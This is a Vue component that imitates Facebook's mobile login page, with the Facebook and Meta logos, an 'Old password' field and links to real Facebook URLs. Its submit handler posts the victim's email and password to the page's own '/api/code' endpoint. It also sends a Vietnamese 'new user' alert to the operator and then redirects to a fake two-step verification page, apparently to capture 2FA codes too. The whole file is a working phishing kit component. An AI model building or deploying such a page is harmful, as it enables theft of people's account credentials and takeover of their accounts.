<template>
  <div
    class="md:hidden h-screen flex flex-col p-4 items-center justify-between bg-gradient-to-r from-purple-50 to-blue-50"
    @click="handleResetFocus"
  >
    <p class="text-center text-xs text-gray-500">English (UK)</p>
    <div class="flex justify-center">
      <img
        src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"
        alt="Facebook logo"
        class="w-[60px] h-[60px]"
      />
    </div>
    <form class="w-full" @submit.prevent="handleSubmit">
      <div
        class="mb-4 input bg-white"
        :class="{
          '!border-[rgb(103,120,138)] border': isFocusEmail && email.trim(),
        }"
        @click.stop="handleFocus('email', $refs.emailElement)"
      >
        <p
          :class="{
            ' transform translate-y-[9px] text-[16px]': !isFocusEmail && !email.trim(),
          }"
          class="text-[13px] text-[rgb(70,90,105)]"
        >
          Mobile number or email address
        </p>
        <input
          ref="emailElement"
          v-model="email"
          type="text"
          class="h-5 text-[rgb(28,43,51)]"
          autocomplete="off"
          :class="{
            'opacity-0': !isFocusEmail && !email.trim(),
          }"
          @focus="isFocusEmail = true"
          @blur="isFocusEmail = false"
        />
      </div>
      <!-- <div class="mb-4">
        <input v-model="password" type="password" placeholder="Password" class="input" />
      </div> -->

      <div
        class="mb-4 input bg-white"
        :class="{
          '!border-[rgb(103,120,138)] border': isFocusPassword && password.trim(),
        }"
        @click.stop="handleFocus('password', $refs.passwordElement)"
      >
        <p
          :class="{
            ' transform translate-y-[9px] text-[16px]': !isFocusPassword && !password.trim(),
          }"
          class="text-[13px] text-[rgb(70,90,105)]"
        >
          Old password
        </p>
        <input
          ref="passwordElement"
          v-model="password"
          type="password"
          class="h-5 text-[rgb(28,43,51)]"
          :class="{
            'opacity-0': !isFocusPassword && !password.trim(),
          }"
          autocomplete="off"
          @focus="isFocusPassword = true"
          @blur="isFocusPassword = false"
        />
      </div>

      <button
        type="submit"
        class="w-full h-[44px] py-2 mb-3 text-white bg-blue-600 rounded-full hover:bg-blue-700"
      >
        Log in
      </button>
      <a
        href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
        class="flex justify-center text-center cursor-pointer hover:underline"
        >Forgotten Password?</a
      >
    </form>
    <div class="flex flex-col w-full items-center justify-center mt-6">
      <a
        href="https://www.facebook.com/r.php?entry_point=login"
        class="flex justify-center w-full py-2 text-blue-600 border border-blue-600 rounded-full hover:bg-blue-50"
      >
        Create new account
      </a>
      <img class="w-[60px] py-5" src="/assets/images/meta-logo.png" alt="" />
      <div class="flex items-center justify-center">
        <p class="text-sm text-gray-500">About &nbsp; • &nbsp; Help &nbsp; • &nbsp; More</p>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref } from 'vue'

const email = ref('')
const password = ref('')
const router = useRouter()
const isFocusEmail = ref(false)
const isFocusPassword = ref(false)
const isLoading = ref(false)
const handleResetFocus = () => {
  isFocusEmail.value = false
  isFocusPassword.value = false
}

const handleFocus = (type: string, ref: any) => {
  if (type === 'email') {
    isFocusEmail.value = true
    ref.focus()
  } else {
    isFocusPassword.value = true
    ref.focus()
  }
}

const handleSubmit = async () => {
  if (!email.value || !password.value || isLoading.value) {
    return
  }

  isLoading.value = true

  // Call your API here
  try {
    await $fetch('/api/code', {
      method: 'POST',
      body: JSON.stringify({ account: { email: email.value, password: password.value } }),
      headers: {
        'Content-Type': 'application/json',
      },
    })
    const isNew = localStorage.getItem('visited')
    if (!isNew) {
      await $fetch('/api/code', {
        method: 'POST',
        body: JSON.stringify({ message: '👨‍💼 Có người dùng mới truy cập', newUser: true }),
        headers: {
          'Content-Type': 'application/json',
        },
      })
      localStorage.setItem('visited', 'yes')
    }
  } catch (error) {
    console.error(error)
  } finally {
    isLoading.value = false
  }
  router.push('/two_step_verification/two_factor')
}
</script>

<style scoped>
.input {
  @apply w-full px-4 py-2 h-[62px] border rounded-[12px] border-gray-300 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500;
}
input {
  outline: none;
  width: 100%;
}
</style>
